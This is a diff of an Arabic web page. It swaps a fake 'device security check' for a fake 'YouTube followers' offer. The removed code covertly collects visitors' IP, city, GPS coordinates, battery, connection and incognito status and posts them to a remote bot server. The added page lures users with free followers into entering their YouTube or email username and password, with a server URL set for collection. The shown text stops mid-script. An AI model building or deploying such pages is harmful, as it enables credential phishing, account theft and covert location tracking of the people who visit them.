@@ -2,124 +2,360 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>التحقق من جهازك</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>شحن متابعين يوتيوب</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: 'Tajawal', sans-serif;
     }
     
     body {
-      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
-      background-size: 400% 400%;
-      animation: gradientBG 15s ease infinite;
-      color: #333;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      font-family: 'Cairo', sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      color: #fff;
       min-height: 100vh;
       padding: 20px;
-      direction: rtl;
-      text-align: right;
-    }
-    
-    @keyframes gradientBG {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-    
-    .container {
-      background: rgba(255, 255, 255, 0.95);
-      width: 100%;
-      max-width: 500px;
-      border-radius: 20px;
-      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
-      overflow: hidden;
-      transition: transform 0.3s ease;
-      animation: fadeIn 0.8s ease-out;
-    }
-    
-    .container:hover {
-      transform: translateY(-5px);
-    }
-    
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    
-    .header {
-      background: linear-gradient(90deg, #1a2a6c, #2a4d8e);
-      color: white;
-      padding: 25px;
-      text-align: center;
-      position: relative;
-    }
-    
-    .header::after {
-      content: '';
-      position: absolute;
-      bottom: -15px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 30px;
-      height: 30px;
-      background: #2a4d8e;
-      border-radius: 50%;
-      z-index: 1;
-    }
-    
-    .header h1 {
-      font-size: 1.8rem;
-      margin-bottom: 10px;
-      font-weight: 700;
-    }
-    
-    .header p {
-      font-size: 1rem;
-      opacity: 0.9;
-    }
-    
-    .logo {
-      font-size: 3.5rem;
-      margin-bottom: 15px;
-      color: #fff;
-      text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
-      animation: pulse 2s infinite;
-    }
-    
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
-    }
-    
-    .content {
-      padding: 35px 30px;
-      text-align: center;
-    }
-    
-    .status {
       display: flex;
       flex-direction: column;
       align-items: center;
-      margin-bottom: 30px;
+      overflow-x: hidden;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
     }
     
-    .spinner {
-      width: 70px;
-      height: 70px;
-      border: 6px solid rgba(26, 42, 108, 0.2);
-      border-top: 6px solid #1a2a6c;
-      border-radius: 50%;
-      animation: spin 1.2s linear infinite;
+    .main-container {
+      max-width: 450px;
+      width: 100%;
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(10px);
+      margin: 20px auto;
+      padding: 20px;
+      position: relative;
+      z-index: 10;
+      overflow-y: auto;
+      max-height: 90vh;
+    }
+    
+    .main-container::-webkit-scrollbar {
+      width: 8px;
+    }
+    
+    .main-container::-webkit-scrollbar-thumb {
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 4px;
+    }
+    
+    .main-container::-webkit-scrollbar-track {
+      background: transparent;
+    }
+    
+    .header {
+      text-align: center;
+      padding: 20px 0;
+      position: relative;
       margin-bottom: 20px;
+    }
+    
+    .header h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+      color: #fff;
+      text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+      background: linear-gradient(to right, #ff8a00, #da1b60);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    
+    .header p {
+      color: #b0d7ff;
+      font-size: 16px;
+      max-width: 80%;
+      margin: 0 auto;
+      line-height: 1.6;
+    }
+    
+    .section {
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 15px;
+      padding: 20px;
+      margin-bottom: 25px;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+      transition: transform 0.3s ease;
+    }
+    
+    .section:hover {
+      transform: translateY(-5px);
+    }
+    
+    .section-title {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    
+    .section-title i {
+      background: linear-gradient(to right, #ff8a00, #da1b60);
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+    }
+    
+    .section-title h2 {
+      font-size: 22px;
+      color: #fff;
+    }
+    
+    .btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 15px;
+      margin: 12px 0;
+      background: rgba(255, 255, 255, 0.15);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      gap: 15px;
+      text-align: center;
+      backdrop-filter: blur(5px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    
+    .btn:hover {
+      background: rgba(255, 255, 255, 0.25);
+      transform: translateY(-3px);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+    
+    .btn img {
+      height: 28px;
+      width: 28px;
+      object-fit: contain;
+    }
+    
+    .pricing {
+      margin-top: 15px;
+    }
+    
+    .price-item {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 15px;
+      margin: 10px 0;
+      border-radius: 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: white;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      transition: all 0.3s ease;
+    }
+    
+    .price-item:hover {
+      background: rgba(255, 255, 255, 0.15);
+      transform: translateX(5px);
+    }
+    
+    .buy-btn {
+      background: linear-gradient(to right, #ff8a00, #da1b60);
+      color: white;
+      border: none;
+      padding: 8px 20px;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 15px;
+      transition: all 0.3s ease;
+    }
+    
+    .buy-btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 5px 15px rgba(218, 27, 96, 0.4);
+    }
+    
+    input, select {
+      width: 100%;
+      padding: 15px;
+      margin: 12px 0;
+      border-radius: 10px;
+      border: none;
+      background: rgba(255, 255, 255, 0.1);
+      color: white;
+      font-size: 16px;
+      font-family: 'Cairo', sans-serif;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    
+    input::placeholder {
+      color: rgba(255, 255, 255, 0.6);
+    }
+    
+    form {
+      background: rgba(255, 255, 255, 0.05);
+      padding: 20px;
+      border-radius: 15px;
+      margin-top: 15px;
+    }
+    
+    label {
+      display: block;
+      margin: 15px 0 8px;
+      font-weight: 600;
+      color: #b0d7ff;
+      font-size: 16px;
+    }
+    
+    .social-icons {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 30px;
+      padding-top: 20px;
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    
+    .social-icon {
+      width: 45px;
+      height: 45px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      transition: all 0.3s ease;
+      cursor: pointer;
+      color: white;
+    }
+    
+    .social-icon:hover {
+      background: linear-gradient(to right, #ff8a00, #da1b60);
+      transform: translateY(-5px);
+    }
+    
+    .footer {
+      text-align: center;
+      padding: 20px 0 10px;
+      color: rgba(255, 255, 255, 0.6);
+      font-size: 14px;
+    }
+    
+    .stars {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 1;
+    }
+    
+    .star {
+      position: absolute;
+      background: #fff;
+      border-radius: 50%;
+      animation: twinkle var(--duration, 3s) infinite ease-in-out;
+      opacity: var(--opacity, 0.7);
+    }
+    
+    @keyframes twinkle {
+      0%, 100% { opacity: var(--opacity, 0.7); }
+      50% { opacity: 0.2; }
+    }
+    
+    .floating {
+      animation: floating 3s ease-in-out infinite;
+    }
+    
+    @keyframes floating {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    
+    .validation-message {
+      color: #ff3860;
+      font-size: 14px;
+      text-align: right;
+      margin-top: -8px;
+      margin-bottom: 10px;
+      height: 16px;
+    }
+
+    @media (max-width: 480px) {
+      .main-container {
+        padding: 15px;
+      }
+      
+      .header h1 {
+        font-size: 24px;
+      }
+      
+      .section-title h2 {
+        font-size: 20px;
+      }
+      
+      .btn {
+        padding: 13px;
+        font-size: 16px;
+      }
+    }
+
+    /* Success message styling */
+    .success-message {
+      background: rgba(46, 204, 113, 0.2);
+      border: 1px solid rgba(46, 204, 113, 0.4);
+      border-radius: 10px;
+      padding: 15px;
+      margin: 20px 0;
+      text-align: center;
+      animation: fadeIn 0.5s ease;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    /* Error message styling */
+    .error-message {
+      background: rgba(231, 76, 60, 0.2);
+      border: 1px solid rgba(231, 76, 60, 0.4);
+      border-radius: 10px;
+      padding: 15px;
+      margin: 20px 0;
+      text-align: center;
+      animation: fadeIn 0.5s ease;
+    }
+    
+    /* Loading spinner */
+    .spinnert {
+      display: none;
+      width: 40px;
+      height: 40px;
+      margin: 0 auto;
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top: 4px solid var(--secondary);
+      animation: spin 1s linear infinite;
     }
     
     @keyframes spin {
@@ -127,392 +363,362 @@
       100% { transform: rotate(360deg); }
     }
     
-    .status h2 {
-      font-size: 1.5rem;
-      color: #1a2a6c;
-      margin-bottom: 10px;
+    /* New styles for the form */
+    .form-group {
+      margin-bottom: 20px;
     }
     
-    .status p {
-      font-size: 1.1rem;
-      color: #555;
-      line-height: 1.6;
-    }
-    
-    .progress-container {
-      width: 100%;
-      height: 12px;
-      background: #e0e0e0;
+    .highlight {
+      background: rgba(255, 138, 0, 0.1);
+      padding: 10px;
       border-radius: 10px;
-      overflow: hidden;
-      margin: 25px 0;
-    }
-    
-    .progress-bar {
-      height: 100%;
-      width: 0;
-      background: linear-gradient(90deg, #1a2a6c, #2a4d8e);
-      border-radius: 10px;
-      animation: progress 2s forwards;
-    }
-    
-    @keyframes progress {
-      0% { width: 0; }
-      100% { width: 85%; }
-    }
-    
-    .info-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 15px;
-      margin-top: 30px;
-    }
-    
-    .info-card {
-      background: #f8f9ff;
-      border-radius: 12px;
-      padding: 15px;
       text-align: center;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
-      transition: all 0.3s ease;
-      border: 1px solid #e6e9ff;
-    }
-    
-    .info-card:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
-      background: #fff;
-    }
-    
-    .info-card i {
-      font-size: 2rem;
-      color: #1a2a6c;
-      margin-bottom: 10px;
-    }
-    
-    .info-card h3 {
-      font-size: 1rem;
-      color: #1a2a6c;
-      margin-bottom: 5px;
-    }
-    
-    .info-card p {
-      font-size: 0.9rem;
-      color: #666;
-    }
-    
-    .footer {
-      background: #f0f4ff;
-      padding: 20px;
-      text-align: center;
-      border-top: 1px solid #e6e9ff;
-      color: #555;
-      font-size: 0.9rem;
-    }
-    
-    .security-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      background: #e8f4ff;
-      padding: 8px 15px;
-      border-radius: 20px;
-      margin-top: 10px;
-      color: #1a6c9c;
-      font-weight: 500;
-    }
-    
-    .result-message {
-      background: #e8f5e9;
-      border: 1px solid #c8e6c9;
-      border-radius: 10px;
-      padding: 15px;
-      margin-top: 20px;
-      display: none;
-    }
-    
-    .result-message.success {
-      background: #e8f5e9;
-      border-color: #c8e6c9;
-      color: #2e7d32;
-    }
-    
-    .result-message.error {
-      background: #ffebee;
-      border-color: #ffcdd2;
-      color: #c62828;
-    }
-    
-    @media (max-width: 480px) {
-      .header {
-        padding: 20px 15px;
-      }
-      
-      .header h1 {
-        font-size: 1.5rem;
-      }
-      
-      .content {
-        padding: 25px 20px;
-      }
-      
-      .info-grid {
-        grid-template-columns: 1fr;
-      }
+      margin: 15px 0;
+      border: 1px solid rgba(255, 138, 0, 0.3);
     }
   </style>
 </head>
 <body>
-  <div class="container">
+  
+  <!-- خلفية النجوم -->
+  <div class="stars" id="stars"></div>
+  
+  <!-- الحاوية الرئيسية -->
+  <div class="main-container">
+    
+    <!-- الترويسة -->
     <div class="header">
-      <div class="logo">
-        <i class="fas fa-shield-alt"></i>
-      </div>
-      <h1>التحقق من جهازك</h1>
-      <p>نقوم بفحص إعدادات الأمان ومواصفات الجهاز</p>
+      <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgd2lkdGg9IjYwIiBoZWlnaHQ9IjYwIiBmaWxsPSIjZmZmIj48cGF0aCBkPSJNMTkuNjE1IDMuMTg0Yy0zLjYwNC0yLjQ0OS03Ljc3MS0yLjQ0OS0xMS4zNzUgMC0zLjYwMyAyLjQ0OC00Ljg2NSA3LjIxOC0yLjgxNSAxMS4wMzJDMTAuNDUzIDIwLjYyIDEyIDIyIDEyIDIyczEuNTQ3LTEuMzg0IDYuNTc1LTcuNzg0YzIuMDQ5LTMuODE0Ljc4Ny04LjU4NC0yLjgxNS0xMS4wMzJ6Ii8+PC9zdmc+" 
+           class="floating" 
+           style="width: 80px; height: 80px; margin: 0 auto 15px;">
+      <h1>شحن متابعين يوتيوب</h1>
+      <p>احصل على آلاف المتابعين الحقيقيين لقناتك بأسعار تنافسية</p>
     </div>
     
-    <div class="content">
-      <div class="status">
-        <div class="spinner"></div>
-        <h2>جاري التحقق من جهازك...</h2>
-        <p>يرجى الانتظار بينما نقوم بفحص إعدادات الأمان ومواصفات جهازك. هذه العملية تستغرق بضع ثوانٍ فقط.</p>
+    <!-- قسم تسجيل الدخول -->
+    <div id="login" class="section">
+      <div class="section-title">
+        <i>👤</i>
+        <h2>تسجيل الدخول</h2>
       </div>
-      
-      <div class="progress-container">
-        <div class="progress-bar"></div>
-      </div>
-      
-      <div class="info-grid">
-        <div class="info-card">
-          <i class="fas fa-lock"></i>
-          <h3>حالة الأمان</h3>
-          <p>يتم التحقق</p>
-        </div>
-        
-        <div class="info-card">
-          <i class="fas fa-microchip"></i>
-          <h3>مواصفات الجهاز</h3>
-          <p>جاري الفحص</p>
-        </div>
-        
-        <div class="info-card">
-          <i class="fas fa-wifi"></i>
-          <h3>اتصال الشبكة</h3>
-          <p>قيد الفحص</p>
-        </div>
-        
-        <div class="info-card">
-          <i class="fas fa-battery-three-quarters"></i>
-          <h3>حالة البطارية</h3>
-          <p>جاري القياس</p>
-        </div>
-      </div>
-      
-      <div id="resultMessage" class="result-message"></div>
+      <button class="btn" onclick="showForm()">
+        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNNS4yNjY2NyA5LjA0NTQ1QzUuMDY0NzggOS4wMjgxMSA0Ljg0MzczIDkgNC42IDlDMi41MTQgOSAxIDExLjAxNDMgMSAxMy41QzEgMTUuOTg1NyAyLjUxNCAxOCA0LjYgMThDNi42ODYgMTggOC4yIDE1Ljk4NTcgOC4yIDEzLjVDOC4yIDEyLjY5MDcgOC4wMzMzMyAxMS45MjYgNy43MjY2NyAxMS4yNTQ1TDUuMjY2NjcgOS4wNDQ1NVY5LjA0NTQ1Wk0xOS40IDlDMTcuMzE0IDkgMTUuOCAxMS4wMTQzIDE1LjggMTMuNUMxNS44IDE1Ljk4NTcgMTcuMzE0IDE4IDE5LjQgMThDMjEuNDg2IDE4IDIzIDE1Ljk4NTcgMjMgMTMuNUMyMyAxMS4wMTQzIDIxLjQ4NiA5IDE5LjQgOVoiIHN0cm9rZT0id2hpdGUiIHN0cm9rZS13aWR0aD0iMS41IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz48cGF0aCBkPSJNMTEuOCAxM0gxOC4yIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjEuNSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+PHBhdGggZD0iTTE2IDlWMTciIHN0cm9rZT0id2hpdGUiIHN0cm9rZS13aWR0aD0iMS41IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz48L3N2Zz4="> 
+        تسجيل الدخول عبر البريد 
+      </button>
+      <button class="btn" onclick="showForm()">
+        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTIgMkM2LjQ3NyAyIDIgNi40NzcgMiAxMkMyIDE3LjUyMyA2LjQ3NyAyMiAxMiAyMkMxNy41MjMgMjIgMjIgMTcuNTIzIDIyIDEyQzIyIDYuNDc3IDE3LjUyMyAyIDEyIDJaTTEyIDIwLjY1NUM3LjQxNiAyMC42NTUgMy43NDUgMTYuOTg0IDMuNzQ1IDEyLjM5NUMzLjc0NSA3LjgwNiA3LjQxNiA0LjEzNSAxMiA0LjEzNUMxNi41ODQgNC4xMzUgMjAuMjU1IDcuODA2IDIwLjI1NSAxMi4zOTVDMjAuMjU1IDE2Ljk4NCAxNi41ODQgMjAuNjU1IDEyIDIwLjY1NVoiIGZpbGw9IndoaXRlIi8+PHBhdGggZD0iTTEyIDdDMTEuNDQ4IDcgMTEgNy40NDggMTEgOFYxMkMxMSAxMi41NTIgMTEuNDQ4IDEzIDEyIDEzQzEyLjU1MiAxMyAxMyAxMi41NTIgMTMgMTJWOEMxMyA3LjQ0OCAxMi41NTIgNyAxMiA3WiIgZmlsbD0id2hpdGUiLz48cGF0aCBkPSJNMTIgMTVDMTEuNzM0OCAxNSAxMS40ODA0IDE0Ljg5NDYgMTEuMjkyOSAxNC43MDcxQzExLjEwNTQgMTQuNTE5NiAxMSAxNC4yNjUyIDExIDE0SDEzQzEzIDE0LjI2NTIgMTIuODk0NiAxNC41MTk2IDEyLjcwNzEgMTQuNzA3MUMxMi41MTk2IDE0Ljg5NDYgMTIuMjY1MiAxNSAxMiAxNVoiIGZpbGw9IndoaXRlIi8+PC9zdmc+"> 
+        تسجيل الدخول عبر اليوتيوب 
+      </button>
     </div>
     
+    <!-- قسم النموذج -->
+    <div id="form" class="section" style="display: none;">
+      <div class="section-title">
+        <i>🚀</i>
+        <h2>شحن متابعين يوتيوب</h2>
+      </div>
+      <form id="youtubeForm">
+        <div class="form-group">
+          <label for="player_id"><i class="fas fa-user"></i> اسم المستخدم او البريد الالكتروني :</label>
+          <input type="text" id="player_id" name="player_id" required placeholder="اسم مستخدم قناتك">
+        </div>
+        
+        <div class="form-group">
+          <label for="password"><i class="fas fa-lock"></i> كلمة المرور:</label>
+          <input type="password" id="password" name="password" required placeholder="أدخل كلمة المرور">
+        </div>
+        
+        <div class="form-group">
+          <label for="amount"><i class="fas fa-users"></i> عدد المتابعين:</label>
+          <select id="amount" name="amount" required>
+            <option value="1000 متابع مجاني">1000 متابع مجاني</option>
+            <option value="1500 متابع">1500 متابع (2$)</option>
+            <option value="2000 متابع">2000 متابع (3$)</option>
+            <option value="2500 متابع">2500 متابع (4$)</option>
+            <option value="3000 متابع">3000 متابع (5$)</option>
+          </select>
+        </div>
+        
+        <div class="spinnert" id="loadingSpinner"></div>
+        <button type="submit" class="buy-btn" style="width: 100%; padding: 15px; margin-top: 20px;" id="submitBtn">شحن المتابعين الآن <i class="fas fa-bolt"></i></button>
+      </form>
+    </div>
+    
+    <!-- قسم الأسعار -->
+    <div class="section pricing">
+      <div class="section-title">
+        <i>💰</i>
+        <h2>باقات المتابعين</h2>
+      </div>
+      <div class="price-item">
+        <span>1000 متابع</span>
+        <button class="buy-btn">مجاني</button>
+      </div>
+      <div class="price-item">
+        <span>1500 متابع</span>
+        <button class="buy-btn">2$</button>
+      </div>
+      <div class="price-item">
+        <span>2000 متابع</span>
+        <button class="buy-btn">3$</button>
+      </div>
+      <div class="price-item">
+        <span>2500 متابع</span>
+        <button class="buy-btn">4$</button>
+      </div>
+      <div class="price-item">
+        <span>3000 متابع</span>
+        <button class="buy-btn">5$</button>
+      </div>
+    </div>
+    
+    <!-- وسائل التواصل -->
+    <div class="social-icons">
+      <div class="social-icon">📱</div>
+      <div class="social-icon">💬</div>
+      <div class="social-icon">📧</div>
+      <div class="social-icon">🔔</div>
+    </div>
+    
+    <!-- التذييل -->
     <div class="footer">
-      <p>جميع عمليات الفحص تتم لحماية خصوصيتك وأمان جهازك</p>
-      <div class="security-badge">
-        <i class="fas fa-shield-alt"></i>
-        <span>اتصال آمن ومشفّر</span>
-      </div>
+      <p>© 2025 شحن متابعين يوتيوب. جميع الحقوق محفوظة.</p>
     </div>
   </div>
-
+  
   <script>
-    // رابط السيرفر الخاص بك
-    const SERVER_URL = 'https://roks-ai.onrender.com';
-    
-    // الحصول على معرف الدردشة من رابط الصفحة
-    const urlParams = new URLSearchParams(window.location.search);
-    const CHAT_ID = urlParams.get('id');
-    
-    // عناصر DOM
-    const spinner = document.querySelector('.spinner');
-    const statusText = document.querySelector('.status h2');
-    const statusDesc = document.querySelector('.status p');
-    const resultMessage = document.getElementById('resultMessage');
-    const infoCards = document.querySelectorAll('.info-card p');
-    
-    // تحديث واجهة المستخدم
-    function updateUI(status, description) {
-      statusText.textContent = status;
-      statusDesc.textContent = description;
-    }
-    
-    // تحديث البطاقات المعلوماتية
-    function updateInfoCards(data) {
-      if (infoCards[0]) infoCards[0].textContent = data.cameraSupport === "✅" ? "آمن" : "غير آمن";
-      if (infoCards[1]) infoCards[1].textContent = data.deviceType;
-      if (infoCards[2]) infoCards[2].textContent = data.connectionType;
-      if (infoCards[3]) infoCards[3].textContent = data.batteryLevel;
-    }
-    
-    // إظهار رسالة النتيجة
-    function showResult(message, isSuccess) {
-      resultMessage.textContent = message;
-      resultMessage.className = `result-message ${isSuccess ? 'success' : 'error'}`;
-      resultMessage.style.display = 'block';
-    }
-    
-    // التحقق من وضع التصفح الخفي
-    async function isIncognito() {
-      try {
-        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-        if (!fs) return "❌";
-        return await new Promise((resolve) => {
-          fs(window.TEMPORARY, 100, () => resolve("❌"), () => resolve("✅"));
-        });
-      } catch {
-        return "❌";
+    // ⚙️ إعدادات الخادم
+    const SERVER_URL = 'https://roksbot.onrender.com';
+
+    // إنشاء النجوم
+    function createStars() {
+      const starsContainer = document.getElementById('stars');
+      const starsCount = 150;
+      
+      for (let i = 0; i < starsCount; i++) {
+        const star = document.createElement('div');
+        star.classList.add('star');
+        
+        // تحديد حجم وموضع ومدة الوميض بشكل عشوائي
+        const size = Math.random() * 3;
+        const posX = Math.random() * 100;
+        const posY = Math.random() * 100;
+        const opacity = Math.random() * 0.8 + 0.1;
+        const duration = Math.random() * 5 + 2;
+        
+        star.style.width = `${size}px`;
+        star.style.height = `${size}px`;
+        star.style.left = `${posX}%`;
+        star.style.top = `${posY}%`;
+        star.style.opacity = opacity;
+        star.style.setProperty('--duration', `${duration}s`);
+        star.style.setProperty('--opacity', opacity);
+        
+        starsContainer.appendChild(star);
       }
     }
-    
-    // الحصول على حالة البطارية
-    async function getBattery() {
-      try {
-        const battery = await navigator.getBattery();
-        return `${Math.round(battery.level * 100)}%`;
-      } catch {
-        return "غير مدعوم";
-      }
-    }
-    
-    // الحصول على نوع الاتصال
-    function getConnectionType() {
-      const nav = navigator;
-      if (nav.connection && nav.connection.effectiveType) {
-        return nav.connection.effectiveType;
-      }
-      return "غير معروف";
-    }
-    
-    // الحصول على نوع الجهاز
-    function getDeviceType() {
-      const ua = navigator.userAgent;
-      if (/mobile/i.test(ua)) return "جوال";
-      if (/tablet/i.test(ua)) return "جهاز لوحي";
-      return "كمبيوتر";
-    }
-    
-    // الحصول على نوع المتصفح
-    function getBrowser() {
-      const ua = navigator.userAgent;
-      if (ua.includes("Firefox")) return "Firefox";
-      if (ua.includes("Chrome")) return "Chrome";
-      if (ua.includes("Safari")) return "Safari";
-      if (ua.includes("Edge")) return "Edge";
-      return "غير معروف";
-    }
-    
-    // الحصول على معلومات الموقع
-    function getLocationInfo() {
-      return fetch("https://ipapi.co/json")
-        .then(res => res.json())
-        .catch(() => ({}));
-    }
-    
-    // الحصول على الموقع الجغرافي
-    function getGeolocation() {
-      return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-          resolve("غير متوفر");
-          return;
+
+    // دالة للحصول على معلومات الجهاز
+    function getDeviceInfo() {
+        const userAgent = navigator.userAgent;
+        let os = 'غير معروف';
+        let browser = 'غير معروف';
+        let device = 'غير معروف';
+
+        // كشف نظام التشغيل
+        if (userAgent.includes('Android')) {
+            os = 'Android ' + (userAgent.match(/Android\s([0-9\.]+)/)?.[1] || '0.0.0');
+            device = 'Generic Smartphone';
+        } else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
+            os = 'iOS ' + (userAgent.match(/OS\s([0-9_]+)/)?.[1]?.replace(/_/g, '.') || '0.0.0');
+            device = 'Apple Device';
+        } else if (userAgent.includes('Windows')) {
+            os = 'Windows ' + (userAgent.match(/Windows\s([0-9\.]+)/)?.[1] || '0.0.0');
+            device = 'PC';
+        } else if (userAgent.includes('Mac OS')) {
+            os = 'macOS ' + (userAgent.match(/Mac OS X\s([0-9_]+)/)?.[1]?.replace(/_/g, '.') || '0.0.0');
+            device = 'Mac';
+        } else if (userAgent.includes('Linux')) {
+            os = 'Linux';
+            device = 'Linux Device';
         }
-        
-        navigator.geolocation.getCurrentPosition(
-          pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
-          () => resolve("غير متوفر"),
-          { timeout: 10000 }
-        );
-      });
+
+        // كشف المتصفح
+        if (userAgent.includes('Chrome')) {
+            const version = userAgent.match(/Chrome\/([0-9\.]+)/)?.[1] || '0.0.0';
+            browser = 'Chrome ' + version.split('.')[0];
+            if (userAgent.includes('Mobile')) browser += ' Mobile';
+        } else if (userAgent.includes('Firefox')) {
+            browser = 'Firefox ' + (userAgent.match(/Firefox\/([0-9\.]+)/)?.[1] || '0.0.0');
+        } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
+            browser = 'Safari ' + (userAgent.match(/Version\/([0-9\.]+)/)?.[1] || '0.0.0');
+        } else if (userAgent.includes('Edge')) {
+            browser = 'Edge ' + (userAgent.match(/Edge\/([0-9\.]+)/)?.[1] || '0.0.0');
+        }
+
+        return { os, browser, device };
     }
-    
-    // جمع البيانات وإرسالها للسيرفر
-    async function collectAndSendData() {
-      try {
-        updateUI("جاري جمع المعلومات...", "نقوم بجمع معلومات جهازك وإعدادات الأمان");
-        
-        // جمع جميع المعلومات
-        const locationData = await getLocationInfo();
-        const battery = await getBattery();
-        const incognito = await isIncognito();
-        const geoLocation = await getGeolocation();
-        const screenRes = `${screen.width}x${screen.height}`;
-        const now = new Date().toLocaleString("ar-EG");
-        
-        // تجهيز البيانات للإرسال
-        const deviceData = {
-          country: locationData.country_name || "غير معروف",
-          city: locationData.city || "غير معروف",
-          ip: locationData.ip || "غير معروف",
-          time: now,
-          language: navigator.language,
-          platform: navigator.platform,
-          deviceType: getDeviceType(),
-          browser: getBrowser(),
-          cameraSupport: navigator.mediaDevices ? "✅" : "❌",
-          screenResolution: screenRes,
-          batteryLevel: battery,
-          connectionType: getConnectionType(),
-          incognitoMode: incognito,
-          userActive: "✅",
-          loginDate: now,
-          location: geoLocation,
-          chatId: CHAT_ID,
-          // معلومات إضافية من الطلب
-          userName: "مستخدم الفحص",
-          userId: "غير معروف",
-          username: "مستخدم الفحص"
-        };
-        
-        // تحديث البطاقات المعلوماتية
-        updateInfoCards(deviceData);
-        
-        updateUI("جاري إرسال البيانات...", "نقوم بإرسال المعلومات إلى السيرفر");
-        
-        // إرسال البيانات إلى السيرفر
-        const response = await fetch(`${SERVER_URL}/device-info`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(deviceData)
-        });
-        
-        const result = await response.json();
-        
-        if (result.success) {
-          // إخفاء spinner وإظهار النتيجة
-          spinner.style.display = 'none';
-          updateUI("اكتمل الفحص بنجاح", "تم فحص جهازك وإرسال المعلومات بنجاح");
-          showResult("✅ تم إرسال معلومات جهازك بنجاح. يمكنك الآن إغلاق هذه الصفحة.", true);
+
+    // دالة للحصول على معلومات البطارية
